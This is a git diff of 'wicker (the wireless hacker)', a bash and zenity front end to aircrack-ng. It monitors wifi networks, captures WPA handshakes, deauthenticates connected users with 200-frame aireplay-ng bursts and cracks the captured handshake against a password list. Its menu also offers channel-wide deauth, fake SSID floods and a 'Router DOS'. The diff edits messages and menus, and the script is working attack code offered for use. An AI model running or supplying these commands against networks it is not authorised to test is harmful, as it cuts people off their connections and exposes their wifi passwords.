@@ -1,5 +1,8 @@
 #!/usr/bin/env bash
 
+#tool-name: wicker (the wireless hacker)
+#author: akrecH
+
 #color codes
 B='\e[1m'
 r='\e[31m'
@@ -9,6 +12,16 @@ b='\e[1;34m'
 p='\e[1;35m'
 s='\e[0m'
 bl='\e[5m'
+
+
+#network interface
+phy=$(basename /sys/class/net/wl*)
+
+if [ "$phy" == "wl*" ];
+then
+   phy='not found'
+fi
+
 
 #collect BSSID
 loot=`iwlist wlan0mon scan | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
@@ -37,15 +50,7 @@ fi
 trap "trap_ctrlc" 2
 
 
-#network interface
-phy=$(basename /sys/class/net/wl*)
-
-if [ "$phy" == "wl*" ];
-then
-   phy='not found'
-fi
-
-#turn on monitor mode [1]
+#turn on monitor mode
 on () {
 (echo "10" ; sleep 1
 echo "# 🥷🏼Turning on monitor mode..." ; sleep 1
@@ -76,7 +81,7 @@ menu
 
 
 
-#turn off monitor mode [2]
+#turn off monitor mode
 off () {
 
 (echo "10" ; sleep 1
@@ -88,12 +93,12 @@ echo "# 🥷🏼Turning interface mode managed from monitor..." ; sleep 1
 sudo xterm -T "☠️wicker☠️"  -e "iw dev wlan0mon set type managed"
 echo "50" ; sleep 1
 
-echo "# 🥷🏼Trying to restart Network Manager..." ; sleep 1
+echo "# 🥷🏼Trying to restart Network manager..." ; sleep 1
 sudo xterm -T "☠️wicker☠️"  -e "service NetworkManager restart"
 echo "75" ; sleep 1
 
-echo "# 🥷🏼Everything looks fine..." ; sleep 1
-echo "100" ; sleep 1
+echo "# 🥷🏼Network manager restarted..." ; sleep 1
+echo "100" ; sleep 2
 ) | zenity --progress \
 --title="☠️wicker☠️" \
 --text="🥷🏼Turning off monitor mode..." \
@@ -107,7 +112,7 @@ menu
 
 
 
-#check injection [3]
+#check injection
 aireplay () {
 sudo aireplay-ng -9 wlan0mon
 menu
@@ -151,9 +156,10 @@ sudo airodump-ng --bssid $bssid wlan0mon
 
 elif [ -z $bssid ];
 then
-zenity --error --width=250
+zenity --error --title="☠️wicker☠️" --width=250
 
 else
+reset;
 sudo airodump-ng --bssid $bssid wlan0mon
 
 fi
@@ -305,23 +311,23 @@ xterm -T "Making a directory for (.cap) files" -e "rm -rf /tmp/WICKER-CAPS && mk
 
 
 (
-echo "# 🥷🏼Saving captured packet in (.cap) file..." ; sleep 1
+echo "# 🥷🏼Saving captured packet in /tmp/WICKER-CAPS..." ; sleep 1
 sudo xterm -T "Trying to capture handshake" -e "airodump-ng --bssid ${bssid} --write '/tmp/WICKER-CAPS/captured-handshake-${bssid}' wlan0mon" &
 sleep 1
 
 
-echo "# 🥷🏼Captured packets are storing in ${PWD} directory..." ; sleep 1
+echo "# 🥷🏼Saved cap file as captured-handshake-${bssid}.cap..." ; sleep 1
 sudo xterm -T "Trying to deauthenticate users from the wifi" -e "aireplay-ng --deauth 200 -D -a ${bssid} wlan0mon" &
 
 sleep 1
 
-echo "# 🥷🏼Deauth process stated..." ; sleep 1
+echo "# 🥷🏼Deauth process started..." ; sleep 1
 
 sleep 1
 
 echo "# 🥷🏼Trying to capture handshake..." ; sleep 1
 
-for i in {1..100}
+for i in {0..100}
 do
 echo $i ; sleep 1
 done
@@ -330,19 +336,35 @@ done
 --title="☠️wicker☠️" \
 --text="🕸️Capture handshake" \
 --percentage=0 \
---auto-close --no-cancel --width=300
+--auto-close --no-cancel --time-remaining --width=300
 
-
+#find the .cap file
 file=`find /tmp/WICKER-CAPS -name "captured-handshake-*.cap"`
-if aircrack-ng $file -w /opt/passwords/cow.txt | grep -q "EAPOL"
+
+#wicker default passwordlist
+pass=/usr/share/wicker/passwords.txt
+
+#check is there any handshake captued on not
+if aircrack-ng $file -w $pass | grep -q "EAPOL"
 then
 opinion=0
-`zenity --question --title= --text="🔐Handshake Captured\n🔓Try to crack it?" --width=300` && opinion=1 || opinion=0
+`zenity --question --title= --text="🔐Handshake Captured\nFile:${file}\n🔓Try to crack it?" --width=300` && opinion=1 || opinion=0
 
 sudo killall xterm 2>/dev/null
-[ "$opinion" == "1" ] && aircrack-ng $file --bssid $bssid -w /opt/passwords/cow.txt
+
+#if user select Yes
+[ "$opinion" == "1" ] && check_pass=`zenity --info --extra-button="Enter manually" --title="☠️wicker☠️" --text="💾Use default passlist?\n📄$pass\n 📄or select manually" --width=300`
+
+[ "$check_pass" == "Enter manually" ] && pass=`zenity --file-selection` && aircrack-ng $file --bssid $bssid -w $pass
+
+[ "$check_pass" != "Enter manually" ] && aircrack-ng $file --bssid $bssid -w $pass
+
+
+#if user select No
 [ "$opinion" == "0" ] && menu
 
+
+#if handshake not captured
 else
 asK=0
 `zenity --question --title="☠️wicker☠️" --text="🟡Process complete...\n🔴No handshake captured\n🔵Try again?" --width=300` && asK=1 || asK=0
@@ -357,7 +379,7 @@ fi
 
 
 
-#router dos [9]
+#router dos
 router () {
 
 ip=$(zenity --entry --title="🚀Router DOS" --text="Enter the routers IP address" --width=400)
@@ -376,14 +398,12 @@ fi
 
 menu () {
 c=$(zenity --list --radiolist --title="☠️Network interface ${phy}️ ☠️" --text="Select an option" --column="Select" --column="Menu Item" \
-FALSE "Turn on monitor mode" \
-FALSE "Turn off monitor mode" \
 FALSE "Capture handshake" \
 FALSE "Deauth wifi" \
 FALSE "Deauth channel" \
 FALSE "Create multiple fake SSID" \
 FALSE "Run airodump-ng" \
-FALSE "Router DOS" --cancel-label="exit" --ok-label="ok" --extra-button="check injection" --width=600 --height=350)
+FALSE "Router DOS" --cancel-label="exit" --ok-label="ok" --extra-button="check injection" --extra-button="Turn off monitor mode" --extra-button="Turn on monitor mode" --height=350 )
 
 if [ "$c" == "Turn on monitor mode" ];
 then
